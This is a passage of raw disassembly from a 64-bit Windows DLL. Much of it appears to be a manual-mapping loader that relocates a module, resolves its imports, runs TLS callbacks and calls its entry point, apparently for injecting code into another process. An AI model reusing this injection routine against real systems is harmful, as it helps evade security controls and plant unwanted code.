   180003a57:	ba 20 00 00 00       	mov    $0x20,%edx
   180003a5c:	41 0f b7 47 06       	movzwl 0x6(%r15),%eax
   180003a61:	41 ff c6             	inc    %r14d
   180003a64:	48 83 c3 28          	add    $0x28,%rbx
   180003a68:	44 3b f0             	cmp    %eax,%r14d
   180003a6b:	75 83                	jne    0x1800039f0
   180003a6d:	41 0f b7 47 14       	movzwl 0x14(%r15),%eax
   180003a72:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   180003a78:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%rbp)
   180003a7f:	49 8b d4             	mov    %r12,%rdx
   180003a82:	48 8b cf             	mov    %rdi,%rcx
   180003a85:	46 8b 44 38 24       	mov    0x24(%rax,%r15,1),%r8d
   180003a8a:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   180003a8e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003a93:	ff 15 d7 25 00 00    	call   *0x25d7(%rip)        # 0x180006070
   180003a99:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   180003a9e:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
   180003aa4:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   180003aa9:	48 8b d3             	mov    %rbx,%rdx
   180003aac:	48 8b cf             	mov    %rdi,%rcx
   180003aaf:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180003ab6:	00 00 
   180003ab8:	ff 15 92 25 00 00    	call   *0x2592(%rip)        # 0x180006050
   180003abe:	85 c0                	test   %eax,%eax
   180003ac0:	75 0c                	jne    0x180003ace
   180003ac2:	48 8d 0d ff 52 00 00 	lea    0x52ff(%rip),%rcx        # 0x180008dc8
   180003ac9:	e8 42 f8 ff ff       	call   0x180003310
   180003ace:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180003ad4:	45 33 c0             	xor    %r8d,%r8d
   180003ad7:	48 8b d3             	mov    %rbx,%rdx
   180003ada:	48 8b cf             	mov    %rdi,%rcx
   180003add:	ff 15 b5 25 00 00    	call   *0x25b5(%rip)        # 0x180006098
   180003ae3:	85 c0                	test   %eax,%eax
   180003ae5:	75 0c                	jne    0x180003af3
   180003ae7:	48 8d 0d fa 52 00 00 	lea    0x52fa(%rip),%rcx        # 0x180008de8
   180003aee:	e8 1d f8 ff ff       	call   0x180003310
   180003af3:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180003af9:	45 33 c0             	xor    %r8d,%r8d
   180003afc:	49 8b d5             	mov    %r13,%rdx
   180003aff:	48 8b cf             	mov    %rdi,%rcx
   180003b02:	ff 15 90 25 00 00    	call   *0x2590(%rip)        # 0x180006098
   180003b08:	85 c0                	test   %eax,%eax
   180003b0a:	75 0c                	jne    0x180003b18
   180003b0c:	48 8d 0d 05 53 00 00 	lea    0x5305(%rip),%rcx        # 0x180008e18
   180003b13:	e8 f8 f7 ff ff       	call   0x180003310
   180003b18:	b0 01                	mov    $0x1,%al
   180003b1a:	eb 1f                	jmp    0x180003b3b
   180003b1c:	48 8d 0d 9d 51 00 00 	lea    0x519d(%rip),%rcx        # 0x180008cc0
   180003b23:	e8 e8 f7 ff ff       	call   0x180003310
   180003b28:	e9 b7 fb ff ff       	jmp    0x1800036e4
   180003b2d:	48 8d 0d 6c 51 00 00 	lea    0x516c(%rip),%rcx        # 0x180008ca0
   180003b34:	e8 d7 f7 ff ff       	call   0x180003310
   180003b39:	32 c0                	xor    %al,%al
   180003b3b:	48 8b b4 24 08 01 00 	mov    0x108(%rsp),%rsi
   180003b42:	00 
   180003b43:	48 8b 9c 24 40 01 00 	mov    0x140(%rsp),%rbx
   180003b4a:	00 
   180003b4b:	4c 8b ac 24 f8 00 00 	mov    0xf8(%rsp),%r13
   180003b52:	00 
   180003b53:	4c 8b a4 24 00 01 00 	mov    0x100(%rsp),%r12
   180003b5a:	00 
   180003b5b:	4c 8b bc 24 f0 00 00 	mov    0xf0(%rsp),%r15
   180003b62:	00 
   180003b63:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   180003b67:	48 33 cc             	xor    %rsp,%rcx
   180003b6a:	e8 21 09 00 00       	call   0x180004490
   180003b6f:	48 81 c4 10 01 00 00 	add    $0x110,%rsp
   180003b76:	41 5e                	pop    %r14
   180003b78:	5f                   	pop    %rdi
   180003b79:	5d                   	pop    %rbp
   180003b7a:	c3                   	ret
   180003b7b:	cc                   	int3
   180003b7c:	cc                   	int3
   180003b7d:	cc                   	int3
   180003b7e:	cc                   	int3
   180003b7f:	cc                   	int3
   180003b80:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180003b85:	48 81 ec e8 00 00 00 	sub    $0xe8,%rsp
   180003b8c:	48 83 bc 24 f0 00 00 	cmpq   $0x0,0xf0(%rsp)
   180003b93:	00 00 
   180003b95:	75 15                	jne    0x180003bac
   180003b97:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180003b9e:	00 
   180003b9f:	48 c7 40 20 40 40 40 	movq   $0x404040,0x20(%rax)
   180003ba6:	00 
   180003ba7:	e9 bd 04 00 00       	jmp    0x180004069
   180003bac:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180003bb3:	00 
   180003bb4:	48 8b 40 18          	mov    0x18(%rax),%rax
   180003bb8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180003bbd:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   180003bc2:	48 63 40 3c          	movslq 0x3c(%rax),%rax
   180003bc6:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003bcb:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
   180003bd0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180003bd5:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180003bdc:	00 
   180003bdd:	48 8b 00             	mov    (%rax),%rax
   180003be0:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
   180003be7:	00 
   180003be8:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180003bef:	00 
   180003bf0:	48 8b 40 08          	mov    0x8(%rax),%rax
   180003bf4:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
   180003bfb:	00 
   180003bfc:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180003c03:	00 
   180003c04:	48 8b 40 10          	mov    0x10(%rax),%rax
   180003c08:	48 89 84 24 c8 00 00 	mov    %rax,0xc8(%rsp)
   180003c0f:	00 
   180003c10:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180003c15:	8b 40 10             	mov    0x10(%rax),%eax
   180003c18:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003c1d:	48 03 c8             	add    %rax,%rcx
   180003c20:	48 8b c1             	mov    %rcx,%rax
   180003c23:	48 89 84 24 d0 00 00 	mov    %rax,0xd0(%rsp)
   180003c2a:	00 
   180003c2b:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180003c30:	48 8b 40 18          	mov    0x18(%rax),%rax
   180003c34:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003c39:	48 2b c8             	sub    %rax,%rcx
   180003c3c:	48 8b c1             	mov    %rcx,%rax
   180003c3f:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   180003c46:	00 
   180003c47:	48 83 bc 24 80 00 00 	cmpq   $0x0,0x80(%rsp)
   180003c4e:	00 00 
   180003c50:	0f 84 51 01 00 00    	je     0x180003da7
   180003c56:	b8 08 00 00 00       	mov    $0x8,%eax
   180003c5b:	48 6b c0 05          	imul   $0x5,%rax,%rax
   180003c5f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180003c64:	83 7c 01 74 00       	cmpl   $0x0,0x74(%rcx,%rax,1)
   180003c69:	0f 84 38 01 00 00    	je     0x180003da7
   180003c6f:	b8 08 00 00 00       	mov    $0x8,%eax
   180003c74:	48 6b c0 05          	imul   $0x5,%rax,%rax
   180003c78:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180003c7d:	8b 44 01 70          	mov    0x70(%rcx,%rax,1),%eax
   180003c81:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003c86:	48 03 c8             	add    %rax,%rcx
   180003c89:	48 8b c1             	mov    %rcx,%rax
   180003c8c:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180003c91:	b8 08 00 00 00       	mov    $0x8,%eax
   180003c96:	48 6b c0 05          	imul   $0x5,%rax,%rax
   180003c9a:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180003c9f:	8b 44 01 74          	mov    0x74(%rcx,%rax,1),%eax
   180003ca3:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   180003ca8:	48 03 c8             	add    %rax,%rcx
   180003cab:	48 8b c1             	mov    %rcx,%rax
   180003cae:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
   180003cb5:	00 
   180003cb6:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   180003cbd:	00 
   180003cbe:	48 39 44 24 38       	cmp    %rax,0x38(%rsp)
   180003cc3:	0f 83 de 00 00 00    	jae    0x180003da7
   180003cc9:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180003cce:	83 78 04 00          	cmpl   $0x0,0x4(%rax)
   180003cd2:	0f 84 cf 00 00 00    	je     0x180003da7
   180003cd8:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180003cdd:	8b 40 04             	mov    0x4(%rax),%eax
   180003ce0:	48 83 e8 08          	sub    $0x8,%rax
   180003ce4:	33 d2                	xor    %edx,%edx
   180003ce6:	b9 02 00 00 00       	mov    $0x2,%ecx
   180003ceb:	48 f7 f1             	div    %rcx
   180003cee:	89 44 24 70          	mov    %eax,0x70(%rsp)
   180003cf2:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180003cf7:	48 83 c0 08          	add    $0x8,%rax
   180003cfb:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   180003d00:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   180003d07:	00 
   180003d08:	eb 18                	jmp    0x180003d22
   180003d0a:	8b 44 24 48          	mov    0x48(%rsp),%eax
   180003d0e:	ff c0                	inc    %eax
   180003d10:	89 44 24 48          	mov    %eax,0x48(%rsp)
   180003d14:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   180003d19:	48 83 c0 02          	add    $0x2,%rax
   180003d1d:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   180003d22:	8b 44 24 70          	mov    0x70(%rsp),%eax
   180003d26:	39 44 24 48          	cmp    %eax,0x48(%rsp)
   180003d2a:	74 5e                	je     0x180003d8a
   180003d2c:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   180003d31:	0f b7 00             	movzwl (%rax),%eax
   180003d34:	c1 f8 0c             	sar    $0xc,%eax
   180003d37:	83 f8 0a             	cmp    $0xa,%eax
   180003d3a:	75 4c                	jne    0x180003d88
   180003d3c:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180003d41:	8b 00                	mov    (%rax),%eax
   180003d43:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003d48:	48 03 c8             	add    %rax,%rcx
   180003d4b:	48 8b c1             	mov    %rcx,%rax
   180003d4e:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   180003d53:	0f b7 09             	movzwl (%rcx),%ecx
   180003d56:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
   180003d5c:	48 63 c9             	movslq %ecx,%rcx
   180003d5f:	48 03 c1             	add    %rcx,%rax
   180003d62:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   180003d69:	00 
   180003d6a:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   180003d71:	00 
   180003d72:	48 8b 00             	mov    (%rax),%rax
   180003d75:	48 03 84 24 80 00 00 	add    0x80(%rsp),%rax
   180003d7c:	00 
   180003d7d:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   180003d84:	00 
   180003d85:	48 89 01             	mov    %rax,(%rcx)
   180003d88:	eb 80                	jmp    0x180003d0a
   180003d8a:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180003d8f:	8b 40 04             	mov    0x4(%rax),%eax
   180003d92:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   180003d97:	48 03 c8             	add    %rax,%rcx
   180003d9a:	48 8b c1             	mov    %rcx,%rax
   180003d9d:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180003da2:	e9 0f ff ff ff       	jmp    0x180003cb6
   180003da7:	b8 08 00 00 00       	mov    $0x8,%eax
   180003dac:	48 6b c0 01          	imul   $0x1,%rax,%rax
   180003db0:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180003db5:	83 7c 01 74 00       	cmpl   $0x0,0x74(%rcx,%rax,1)
   180003dba:	0f 84 6e 01 00 00    	je     0x180003f2e
   180003dc0:	b8 08 00 00 00       	mov    $0x8,%eax
   180003dc5:	48 6b c0 01          	imul   $0x1,%rax,%rax
   180003dc9:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180003dce:	8b 44 01 70          	mov    0x70(%rcx,%rax,1),%eax
   180003dd2:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003dd7:	48 03 c8             	add    %rax,%rcx
   180003dda:	48 8b c1             	mov    %rcx,%rax
   180003ddd:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180003de2:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180003de7:	83 78 0c 00          	cmpl   $0x0,0xc(%rax)
   180003deb:	0f 84 3d 01 00 00    	je     0x180003f2e
   180003df1:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180003df6:	8b 40 0c             	mov    0xc(%rax),%eax
   180003df9:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003dfe:	48 03 c8             	add    %rax,%rcx
   180003e01:	48 8b c1             	mov    %rcx,%rax
   180003e04:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
   180003e0b:	00 
   180003e0c:	48 8b 8c 24 a8 00 00 	mov    0xa8(%rsp),%rcx
   180003e13:	00 
   180003e14:	ff 94 24 b0 00 00 00 	call   *0xb0(%rsp)
   180003e1b:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   180003e22:	00 
   180003e23:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180003e28:	8b 00                	mov    (%rax),%eax
   180003e2a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003e2f:	48 03 c8             	add    %rax,%rcx
   180003e32:	48 8b c1             	mov    %rcx,%rax
   180003e35:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180003e3a:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180003e3f:	8b 40 10             	mov    0x10(%rax),%eax
   180003e42:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003e47:	48 03 c8             	add    %rax,%rcx
   180003e4a:	48 8b c1             	mov    %rcx,%rax
   180003e4d:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   180003e52:	48 83 7c 24 40 00    	cmpq   $0x0,0x40(%rsp)
   180003e58:	75 0a                	jne    0x180003e64
   180003e5a:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   180003e5f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180003e64:	eb 1c                	jmp    0x180003e82
   180003e66:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180003e6b:	48 83 c0 08          	add    $0x8,%rax
   180003e6f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180003e74:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   180003e79:	48 83 c0 08          	add    $0x8,%rax
   180003e7d:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   180003e82:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180003e87:	48 83 38 00          	cmpq   $0x0,(%rax)
   180003e8b:	0f 84 8a 00 00 00    	je     0x180003f1b
   180003e91:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180003e96:	48 b9 00 00 00 00 00 	movabs $0x8000000000000000,%rcx
   180003e9d:	00 00 80 
   180003ea0:	48 8b 00             	mov    (%rax),%rax
   180003ea3:	48 23 c1             	and    %rcx,%rax
   180003ea6:	48 85 c0             	test   %rax,%rax
   180003ea9:	74 2a                	je     0x180003ed5
   180003eab:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180003eb0:	48 8b 00             	mov    (%rax),%rax
   180003eb3:	48 25 ff ff 00 00    	and    $0xffff,%rax
   180003eb9:	48 8b d0             	mov    %rax,%rdx
   180003ebc:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   180003ec3:	00 
   180003ec4:	ff 94 24 98 00 00 00 	call   *0x98(%rsp)
   180003ecb:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180003ed0:	48 89 01             	mov    %rax,(%rcx)
   180003ed3:	eb 41                	jmp    0x180003f16
   180003ed5:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180003eda:	48 8b 00             	mov    (%rax),%rax
   180003edd:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003ee2:	48 03 c8             	add    %rax,%rcx
   180003ee5:	48 8b c1             	mov    %rcx,%rax
   180003ee8:	48 89 84 24 b8 00 00 	mov    %rax,0xb8(%rsp)
   180003eef:	00 
   180003ef0:	48 8b 84 24 b8 00 00 	mov    0xb8(%rsp),%rax
   180003ef7:	00 
   180003ef8:	48 83 c0 02          	add    $0x2,%rax
   180003efc:	48 8b d0             	mov    %rax,%rdx
   180003eff:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   180003f06:	00 
   180003f07:	ff 94 24 98 00 00 00 	call   *0x98(%rsp)
   180003f0e:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180003f13:	48 89 01             	mov    %rax,(%rcx)
   180003f16:	e9 4b ff ff ff       	jmp    0x180003e66
   180003f1b:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180003f20:	48 83 c0 14          	add    $0x14,%rax
   180003f24:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180003f29:	e9 b4 fe ff ff       	jmp    0x180003de2
   180003f2e:	b8 08 00 00 00       	mov    $0x8,%eax
   180003f33:	48 6b c0 09          	imul   $0x9,%rax,%rax
   180003f37:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180003f3c:	83 7c 01 74 00       	cmpl   $0x0,0x74(%rcx,%rax,1)
   180003f41:	74 70                	je     0x180003fb3
   180003f43:	b8 08 00 00 00       	mov    $0x8,%eax
   180003f48:	48 6b c0 09          	imul   $0x9,%rax,%rax
   180003f4c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180003f51:	8b 44 01 70          	mov    0x70(%rcx,%rax,1),%eax
   180003f55:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003f5a:	48 03 c8             	add    %rax,%rcx
   180003f5d:	48 8b c1             	mov    %rcx,%rax
   180003f60:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
   180003f67:	00 
   180003f68:	48 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%rax
   180003f6f:	00 
   180003f70:	48 8b 40 18          	mov    0x18(%rax),%rax
   180003f74:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180003f79:	eb 0e                	jmp    0x180003f89
   180003f7b:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180003f80:	48 83 c0 08          	add    $0x8,%rax
   180003f84:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180003f89:	48 83 7c 24 60 00    	cmpq   $0x0,0x60(%rsp)
   180003f8f:	74 22                	je     0x180003fb3
   180003f91:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180003f96:	48 83 38 00          	cmpq   $0x0,(%rax)
   180003f9a:	74 17                	je     0x180003fb3
   180003f9c:	45 33 c0             	xor    %r8d,%r8d
   180003f9f:	ba 01 00 00 00       	mov    $0x1,%edx
   180003fa4:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003fa9:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180003fae:	ff 10                	call   *(%rax)
   180003fb0:	90                   	nop
   180003fb1:	eb c8                	jmp    0x180003f7b
   180003fb3:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   180003fb8:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180003fbf:	00 
   180003fc0:	83 78 38 00          	cmpl   $0x0,0x38(%rax)
   180003fc4:	74 53                	je     0x180004019
   180003fc6:	b8 08 00 00 00       	mov    $0x8,%eax
   180003fcb:	48 6b c0 03          	imul   $0x3,%rax,%rax
   180003fcf:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180003fd4:	48 8b 44 01 70       	mov    0x70(%rcx,%rax,1),%rax
   180003fd9:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   180003fde:	83 7c 24 7c 00       	cmpl   $0x0,0x7c(%rsp)
   180003fe3:	74 34                	je     0x180004019
   180003fe5:	8b 44 24 7c          	mov    0x7c(%rsp),%eax
   180003fe9:	33 d2                	xor    %edx,%edx
   180003feb:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180003ff0:	48 f7 f1             	div    %rcx
   180003ff3:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   180003ff7:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   180003ffc:	48 03 d1             	add    %rcx,%rdx
   180003fff:	48 8b ca             	mov    %rdx,%rcx
   180004002:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   180004007:	8b d0                	mov    %eax,%edx
   180004009:	ff 94 24 c8 00 00 00 	call   *0xc8(%rsp)
   180004010:	85 c0                	test   %eax,%eax
   180004012:	75 05                	jne    0x180004019
   180004014:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   180004019:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180004020:	00 
   180004021:	4c 8b 40 30          	mov    0x30(%rax),%r8
   180004025:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   18000402c:	00 
   18000402d:	8b 50 28             	mov    0x28(%rax),%edx
   180004030:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180004035:	ff 94 24 d0 00 00 00 	call   *0xd0(%rsp)
   18000403c:	90                   	nop
   18000403d:	0f b6 44 24 20       	movzbl 0x20(%rsp),%eax
   180004042:	85 c0                	test   %eax,%eax
   180004044:	74 12                	je     0x180004058
   180004046:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   18000404d:	00 
   18000404e:	48 c7 40 20 50 50 50 	movq   $0x505050,0x20(%rax)
   180004055:	00 
   180004056:	eb 11                	jmp    0x180004069
   180004058:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   18000405f:	00 
   180004060:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180004065:	48 89 48 20          	mov    %rcx,0x20(%rax)
   180004069:	48 81 c4 e8 00 00 00 	add    $0xe8,%rsp
   180004070:	c3                   	ret
   180004071:	cc                   	int3
   180004072:	cc                   	int3
   180004073:	cc                   	int3
   180004074:	cc                   	int3
   180004075:	cc                   	int3
   180004076:	cc                   	int3
   180004077:	cc                   	int3
   180004078:	cc                   	int3
   180004079:	cc                   	int3
   18000407a:	cc                   	int3
   18000407b:	cc                   	int3
   18000407c:	cc                   	int3
   18000407d:	cc                   	int3
   18000407e:	cc                   	int3
   18000407f:	cc                   	int3
   180004080:	8b 05 8e 6f 00 00    	mov    0x6f8e(%rip),%eax        # 0x18000b014
   180004086:	4c 8b ca             	mov    %rdx,%r9
   180004089:	4c 2b c9             	sub    %rcx,%r9
   18000408c:	4c 8b d2             	mov    %rdx,%r10
   18000408f:	49 8b d1             	mov    %r9,%rdx
   180004092:	48 83 e2 e0          	and    $0xffffffffffffffe0,%rdx
   180004096:	0f 84 92 00 00 00    	je     0x18000412e
   18000409c:	a8 20                	test   $0x20,%al
   18000409e:	0f 84 8a 00 00 00    	je     0x18000412e
   1800040a4:	41 0f be c0          	movsbl %r8b,%eax
   1800040a8:	48 03 d1             	add    %rcx,%rdx
   1800040ab:	c5 f9 6e d8          	vmovd  %eax,%xmm3
   1800040af:	c5 f9 ef c0          	vpxor  %xmm0,%xmm0,%xmm0
   1800040b3:	c4 e2 61 00 d8       	vpshufb %xmm0,%xmm3,%xmm3
   1800040b8:	c4 e3 65 18 db 01    	vinsertf128 $0x1,%xmm3,%ymm3,%ymm3
   1800040be:	66 90                	xchg   %ax,%ax
   1800040c0:	c5 e5 74 09          	vpcmpeqb (%rcx),%ymm3,%ymm1
   1800040c4:	c5 fd d7 c1          	vpmovmskb %ymm1,%eax
   1800040c8:	85 c0                	test   %eax,%eax
   1800040ca:	75 55                	jne    0x180004121
   1800040cc:	48 83 c1 20          	add    $0x20,%rcx
   1800040d0:	48 3b ca             	cmp    %rdx,%rcx
   1800040d3:	75 eb                	jne    0x1800040c0
   1800040d5:	41 83 e1 1c          	and    $0x1c,%r9d
   1800040d9:	74 2d                	je     0x180004108
   1800040db:	41 8b d1             	mov    %r9d,%edx
   1800040de:	48 8d 05 6b 47 00 00 	lea    0x476b(%rip),%rax        # 0x180008850
   1800040e5:	48 83 e2 fc          	and    $0xfffffffffffffffc,%rdx
   1800040e9:	48 2b c2             	sub    %rdx,%rax
   1800040ec:	c5 fe 6f 10          	vmovdqu (%rax),%ymm2
   1800040f0:	c4 e2 6d 8c 01       	vpmaskmovd (%rcx),%ymm2,%ymm0
   1800040f5:	c5 fd 74 cb          	vpcmpeqb %ymm3,%ymm0,%ymm1
   1800040f9:	c5 f5 db d2          	vpand  %ymm2,%ymm1,%ymm2
   1800040fd:	c5 fd d7 c2          	vpmovmskb %ymm2,%eax
   180004101:	85 c0                	test   %eax,%eax
   180004103:	75 1c                	jne    0x180004121
   180004105:	49 03 c9             	add    %r9,%rcx
   180004108:	c5 f8 77             	vzeroupper
   18000410b:	49 3b ca             	cmp    %r10,%rcx
   18000410e:	74 0d                	je     0x18000411d
   180004110:	44 38 01             	cmp    %r8b,(%rcx)
   180004113:	74 08                	je     0x18000411d
   180004115:	48 ff c1             	inc    %rcx
   180004118:	49 3b ca             	cmp    %r10,%rcx
   18000411b:	75 f3                	jne    0x180004110
   18000411d:	48 8b c1             	mov    %rcx,%rax
   180004120:	c3                   	ret
   180004121:	c5 f8 77             	vzeroupper
   180004124:	f3 0f bc c0          	tzcnt  %eax,%eax
   180004128:	8b c0                	mov    %eax,%eax
   18000412a:	48 03 c1             	add    %rcx,%rax
   18000412d:	c3                   	ret
   18000412e:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   180004132:	74 d7                	je     0x18000410b
   180004134:	a8 04                	test   $0x4,%al
   180004136:	74 d3                	je     0x18000410b
   180004138:	41 0f b6 c0          	movzbl %r8b,%eax
   18000413c:	49 8d 14 09          	lea    (%r9,%rcx,1),%rdx
   180004140:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004143:	66 0f 6e c8          	movd   %eax,%xmm1
   180004147:	66 0f 38 00 c8       	pshufb %xmm0,%xmm1
   18000414c:	0f 1f 40 00          	nopl   0x0(%rax)
   180004150:	f3 0f 6f 01          	movdqu (%rcx),%xmm0
   180004154:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   180004158:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   18000415c:	85 c0                	test   %eax,%eax
   18000415e:	75 0b                	jne    0x18000416b
   180004160:	48 83 c1 10          	add    $0x10,%rcx
   180004164:	48 3b ca             	cmp    %rdx,%rcx
   180004167:	75 e7                	jne    0x180004150
   180004169:	eb a0                	jmp    0x18000410b
   18000416b:	0f bc c0             	bsf    %eax,%eax
   18000416e:	48 03 c1             	add    %rcx,%rax
   180004171:	c3                   	ret
   180004172:	cc                   	int3
   180004173:	cc                   	int3
   180004174:	cc                   	int3
   180004175:	cc                   	int3
   180004176:	cc                   	int3
   180004177:	cc                   	int3
   180004178:	cc                   	int3
   180004179:	cc                   	int3
   18000417a:	cc                   	int3
   18000417b:	cc                   	int3
   18000417c:	cc                   	int3
   18000417d:	cc                   	int3
   18000417e:	cc                   	int3
   18000417f:	cc                   	int3
   180004180:	8b 05 8e 6e 00 00    	mov    0x6e8e(%rip),%eax        # 0x18000b014
   180004186:	4c 8b ca             	mov    %rdx,%r9
   180004189:	4c 2b c9             	sub    %rcx,%r9
   18000418c:	4d 8b d1             	mov    %r9,%r10
   18000418f:	49 83 e2 e0          	and    $0xffffffffffffffe0,%r10
   180004193:	74 77                	je     0x18000420c
   180004195:	a8 20                	test   $0x20,%al
   180004197:	74 73                	je     0x18000420c
   180004199:	c4 c1 79 6e d8       	vmovd  %r8d,%xmm3
   18000419e:	c5 f9 70 db 00       	vpshufd $0x0,%xmm3,%xmm3
   1800041a3:	c4 e3 65 18 db 01    	vinsertf128 $0x1,%xmm3,%ymm3,%ymm3
   1800041a9:	49 8d 14 0a          	lea    (%r10,%rcx,1),%rdx
   1800041ad:	0f 1f 00             	nopl   (%rax)
   1800041b0:	c5 e5 76 09          	vpcmpeqd (%rcx),%ymm3,%ymm1
   1800041b4:	c5 fd d7 c1          	vpmovmskb %ymm1,%eax
   1800041b8:	85 c0                	test   %eax,%eax
   1800041ba:	75 43                	jne    0x1800041ff
   1800041bc:	48 83 c1 20          	add    $0x20,%rcx
   1800041c0:	48 3b ca             	cmp    %rdx,%rcx
   1800041c3:	75 eb                	jne    0x1800041b0
